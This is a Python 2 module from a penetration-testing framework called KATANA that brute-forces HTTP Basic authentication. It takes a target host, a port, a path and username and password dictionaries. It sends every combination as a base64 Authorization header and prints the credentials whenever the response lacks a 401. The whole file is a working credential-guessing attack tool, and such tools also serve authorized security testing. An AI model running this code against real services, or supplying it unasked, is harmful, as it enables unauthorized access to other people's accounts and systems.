# KATANA
# Brute Force HTTP Authentication
# Script by RedToor
# 27/02/2015

import socket
import base64
from core import help
W  = '\033[0m'  
R  = '\033[31m' 
G  = '\033[32m' 
O  = '\033[33m' 
B  = '\033[34m' 
P  = '\033[35m' 
C  = '\033[36m' 
GR = '\033[37m'
defoulthost="127.0.0.1"
defoultport="80"
defoultpach="/"
defoultdic1="core/db/user.dicc"
defoultdic2="core/db/pass.dicc"
def httpbt():
	global defoulthost,defoultport,defoultpach,defoultdic1,defoultdic2
	actions = raw_input(B+"   web/httpbt > "+W)
	if actions == "show options":
		print "     ["+R+"+"+W+"] options"
		print "     target         : yes"
		print "     port           : no/yes"
		print "     patch          : no/yes"
		print "     dictionaries   : no/yes\n"
		print "     ["+G+"+"+W+"] options current"
		print "     target         : ",defoulthost
		print "     port           : ",defoultport
		print "     patch          : ",defoultpach
		print "     dictionary_1   : ",defoultdic1
		print "     dictionary_2   : ",defoultdic2
		httpbt()
	elif actions=="back":
		pass
	elif actions=="exit":
		print C+"   GooD"+W+" bye."
		exit()
	elif actions[0:10] == "set target":
			defoulthost = actions[11:]
			defoulthost = defoulthost.replace("http://", "")
			print "     target         : "+defoulthost+" "+O+"     Saved!!!"+W
			httpbt()
	elif actions[0:8] == "set port":
			defoultport = actions[9:]
			print "     port           : "+defoultport+" "+O+"     Saved!!!"+W
			httpbt()
	elif actions[0:9] == "set patch":
			defoultpach = actions[10:]
			print "     patch          : "+defoultpach+" "+O+"     Saved!!!"+W
			httpbt()
	elif actions[0:16] == "set dictionary_1":
			defoultdic1 = actions[17:]
			print "     dictionary_1   : "+defoultdic1+" "+O+"     Saved!!!"+W
			httpbt()
	elif actions[0:16] == "set dictionary_2":
			defoultdic2 = actions[17:]
			print "     dictionary_2   : "+defoultdic2+" "+O+"     Saved!!!"+W
			httpbt()
	elif actions == "help":
		help.help()
	elif actions == "run":
			print("\n     ["+O+"!"+W+"] Checking target")
			print "     ["+G+"+"+W+"] options current"
			print "     target         : "+defoulthost
			print "     port           : "+defoultport
			print "     patch          : "+defoultpach
			print "     dictionary_1   : "+defoultdic1
			print "     dictionary_2   : "+defoultdic2
			print  
			try:
				red=socket.socket(socket.AF_INET, socket.SOCK_STREAM)       
				red.connect((defoulthost, int(defoultport))) 
				if True:
					print("     ["+G+"+"+W+"] target LIVE")
					print("     ["+G+"+"+W+"] Running")
					try:
						with open(defoultdic1,'r') as user:
							for us in user: 
								with open(defoultdic2,'r') as passs:
									for ps in passs:
										us=us.replace("\n","")
										ps=ps.replace("\n","")
										red.send("GET "+defoultpach+" HTTP/1.1\r\n")							
										red.send("HOST: "+defoulthost+"\r\n")							
										red.send("Authorization:Basic "+base64.b64encode(us+":"+ps)+"\r\n\r\n")  
										last=red.recv(1000)	
										if last.find("401")<=0:
											print "     ["+G+"+"+W+"] SUCCESSFUL with user: "+us+" , pass: "+ps+"\n"
											red.close
											httpbt()
										else:
											print "     ["+O+"!"+W+"] Checking with user: "+us+" , pass: "+ps
											red.close
					except(KeyboardInterrupt, SystemExit):
						print("   ["+O+"!"+W+"] (Ctrl + C) Detected, System Exit")
			except:
				print("     ["+R+"-"+W+"] target DEAD")
	httpbt()